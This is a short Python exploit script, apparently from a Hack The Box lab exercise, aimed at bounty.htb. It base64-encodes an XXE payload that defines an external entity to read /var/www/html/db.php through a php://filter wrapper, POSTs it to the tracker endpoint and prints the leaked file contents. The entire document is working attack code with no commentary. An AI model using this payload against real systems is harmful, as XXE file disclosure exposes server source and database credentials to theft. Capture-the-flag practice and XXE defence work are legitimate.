from base64 import b64encode as b64e
import requests

url = "http://bounty.htb/tracker_diRbPr00f314.php"

payload = {"data": f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ENTITY one SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
		<bugreport>
		<title>&one;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>"""}

payload["data"] = b64e(payload["data"].encode())

r = requests.post(url, data=payload)

print(r.text)
